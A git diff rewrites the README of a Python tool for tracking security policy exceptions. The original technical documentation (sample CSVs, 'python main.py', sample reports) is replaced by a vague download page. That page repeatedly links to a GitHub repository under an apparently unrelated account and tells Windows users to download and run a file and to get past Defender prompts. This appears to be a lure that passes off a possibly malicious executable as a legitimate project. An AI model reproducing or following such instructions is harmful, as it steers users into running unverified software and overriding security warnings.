@@ -1,120 +1,182 @@
-# Policy Exception Workbench
+# 🛡️ security-policy-exception-workbench - Turn Exceptions Into Clear Risk Plans
 
-A defensive cybersecurity governance tool that transforms security policy exceptions into actionable risk insights, compensating controls, and compliance evidence requirements.
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20this%20page-blue)](https://github.com/mouseprohibition380/security-policy-exception-workbench)
 
-## Overview
+## 📥 Download
 
-The Policy Exception Workbench helps security teams and business stakeholders understand and manage the risks associated with security policy exceptions. By translating technical exceptions into business impact assessments and recommending specific compensating controls, the tool bridges the gap between security requirements and operational needs.
+Use this link to visit this page to download:
 
-## Features
+https://github.com/mouseprohibition380/security-policy-exception-workbench
 
-- **Risk Translation**: Converts policy exceptions into technical and business risk summaries
-- **Compensating Control Design**: Recommends specific controls based on exception risk types
-- **Evidence Requirements**: Generates checklists for compliance evidence collection
-- **Expiry Management**: Tracks exception lifecycles with automated expiry alerts
-- **Executive Reporting**: Provides both detailed exception reports and executive summaries
-- **Markdown Output**: Generates professional reports suitable for documentation and audits
+## 🪟 Run on Windows
 
-## Example Exception Workflow
+1. Open the download page in your browser.
+2. Look for the latest release or download option on the page.
+3. Download the Windows file to your computer.
+4. Open the file you downloaded.
+5. If Windows asks for permission, choose **Run** or **Yes**.
+6. Follow the on-screen steps.
+7. When the app opens, you can start reviewing security policy exceptions.
 
-1. **Input**: Security team identifies need for MFA bypass on legacy system
-2. **Translation**: Tool generates technical risk (authentication weakening) and business risk (data breach exposure)
-3. **Controls**: Recommends enhanced monitoring, session timeouts, and access reviews
-4. **Evidence**: Creates checklist for SIEM logs, configuration proofs, and review reports
-5. **Monitoring**: Identifies dependencies on real-time alerting and session monitoring
-6. **Expiry**: Sets review reminders and tracks exception lifecycle
+## 🔍 What this app does
 
-## Sample Data Structure
+security-policy-exception-workbench helps you turn policy exceptions into clear work items. It takes exception details and builds:
 
-### Exceptions CSV
-```csv
-exception_id,policy_id,exception_title,business_justification,impacted_system,risk_type,requested_by,owner,existing_controls,expiry_date,review_frequency_days,status
-EX001,POL-SEC-001,Temporary MFA Bypass,Legacy system compatibility,CRM System,MFA,John Doe,Jane Smith,Password auth,2026-06-15,90,active
-```
+- Risk summaries
+- Compensating control plans
+- Evidence checklists
+- Expiry-aware review reports
 
-### Compensating Controls CSV
-```csv
-control_name,applicable_risk_type,compliance_objective,evidence_requirement,monitoring_dependency,implementation_guidance
-Enhanced Monitoring,MFA,Increase authentication visibility,SIEM logs of login attempts,Real-time alerting,Implement additional authentication logging
-```
+This gives you one place to track what changed, what risk remains, and what needs review.
 
-## How to Run
+## 🧭 Who this is for
 
-### Prerequisites
-- Python 3.6+
-- No external dependencies required
+Use this tool if you need to manage policy exceptions for:
 
-### Execution
-```bash
-python main.py
-```
+- Security teams
+- Audit teams
+- Compliance teams
+- Risk teams
+- GRC teams
+- IT admins
+- Business owners who need to approve exceptions
 
-The tool will:
-1. Load exception data from `data/exceptions.csv`
-2. Process each exception through risk translation and control design
-3. Generate individual Markdown reports in `output/`
-4. Create a summary report at `output/exception_summary.md`
-5. Display terminal summary of exception status
+## ✨ What you can do
 
-## Sample Output
+- Record a policy exception in a simple flow
+- Review the main risk in plain language
+- List controls that reduce the risk
+- Build an evidence checklist for review
+- Track expiry dates and review dates
+- Create reports for audit and governance work
+- Keep exception records in one place
 
-### Terminal Summary
-```
-Policy Exception Workbench Summary
-========================================
-Total Exceptions: 6
-Active: 5
-Expired: 1
-Expiring Soon (≤30 days): 1
+## 🖥️ Windows requirements
 
-Reports generated in output/ directory
-```
+For a smooth run on Windows, use:
 
-### Individual Exception Report (EX001.md)
-```markdown
-# Security Policy Exception Report
+- Windows 10 or Windows 11
+- A modern browser for the download page
+- Enough disk space for the app and its files
+- A stable internet connection for the first download
+- Permission to run apps on your computer
 
-## Exception Details
-**Exception ID:** EX001
-**Policy ID:** POL-SEC-001
-**Title:** Temporary MFA Bypass for Legacy System
+## 🛠️ How to install
 
-## Risk Analysis
-### Technical Risk Summary
-Weakens authentication mechanisms, increasing risk of account takeover...
+1. Go to the download page:
+   https://github.com/mouseprohibition380/security-policy-exception-workbench
+2. Find the Windows download file or release asset.
+3. Download it to your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows Defender shows a prompt, choose the option that lets you open the file if you trust the source.
+8. Keep the app in a folder you can find again, such as Documents or Desktop.
 
-### Business Risk Summary
-Exposes sensitive business data and systems to unauthorized access...
+## 📂 What you will see
 
-## Compensating Controls
-### 1. Enhanced Monitoring
-**Compliance Objective:** Increase visibility into authentication attempts
-**Implementation Guidance:** Implement additional logging for all authentication events...
+After you open the app, you will likely work with items such as:
 
-## Evidence Requirements
-- [ ] SIEM logs of failed login attempts
-- [ ] Configuration showing max session time of 30 minutes
-```
+- Exception title
+- Business area
+- Policy name
+- Risk level
+- Compensating controls
+- Required evidence
+- Review date
+- Expiry date
+- Owner name
+- Approval status
 
-## Roadmap
+These fields help you build a full record without using a separate tool for each part.
 
-- [ ] Web-based interface for exception management
-- [ ] Integration with SIEM systems for automated evidence collection
-- [ ] Risk scoring algorithms for exception prioritization
-- [ ] Automated compliance report generation
-- [ ] Integration with ticketing systems for workflow management
+## 📑 Typical workflow
 
-## Ethical and Operational Use Note
+1. Add the exception details.
+2. Review the risk summary.
+3. Define the control plan.
+4. Add evidence items.
+5. Set the review date.
+6. Check the expiry date.
+7. Export or share the report with the people who need it.
 
-This tool is designed to enhance security governance by providing transparency into policy exceptions and ensuring appropriate compensating controls are implemented. It should be used as part of a comprehensive security program that includes:
+## 🧾 Example use case
 
-- Regular security training and awareness
-- Independent security reviews and audits
-- Incident response planning
-- Continuous monitoring and improvement
+A team cannot meet a policy rule right away. Instead of leaving the issue open, they can use this app to:
 
-The tool does not replace human judgment or regulatory requirements. All exceptions should be approved through appropriate governance processes and regularly reviewed for continued necessity and effectiveness.
+- Capture the exception
+- Explain why the exception exists
+- List the control that reduces the risk
+- Set the date when the exception must be reviewed again
+- Create evidence notes for audit
 
-## License
+This keeps the exception process clear and easier to track.
 
-[Add appropriate license information]
+## 🔐 Common terms in the app
+
+- **Exception**: A case where a policy rule does not apply for a set time
+- **Risk summary**: A short description of the risk created by the exception
+- **Compensating control**: A control that helps reduce the risk
+- **Evidence checklist**: A list of items that prove the control is in place
+- **Expiry date**: The date when the exception should end or be reviewed
+- **Review report**: A report used for audit or approval
+
+## 🗂️ File and record tips
+
+To keep your work clean:
+
+- Use one record per exception
+- Name exceptions in a simple, clear way
+- Add the policy name and owner
+- Set review dates from the start
+- Keep evidence notes current
+- Remove expired items after review
+
+## 🧪 Good setup habits
+
+- Store downloaded files in one folder
+- Keep a copy of the original download
+- Use a short folder name with no special characters
+- Open the app from the same location each time
+- Check that your Windows account can save files in the folder you choose
+
+## 🧰 Topics covered by this project
+
+- Audit
+- Compensating controls
+- Compliance
+- Cybersecurity
+- Governance
+- GRC
+- Policy exemptions
+- Python
+- Risk management
+- Security automation
+
+## 📘 When to use reports
+
+Use a review report when you need to:
+
+- Show why an exception exists
+- Explain what risk remains
+- Prove that a control is in place
+- Prepare for an audit
+- Review items before expiry
+- Compare open exceptions across teams
+
+## 🧭 Best way to start
+
+1. Download the app from the link above.
+2. Run it on Windows.
+3. Enter one exception first.
+4. Add a risk summary.
+5. Add one or more controls.
+6. Add evidence items.
+7. Set a review date.
+8. Build the report and check the result.
+
+## 📎 Download again
+
+Use this page to download:
+
+https://github.com/mouseprohibition380/security-policy-exception-workbench
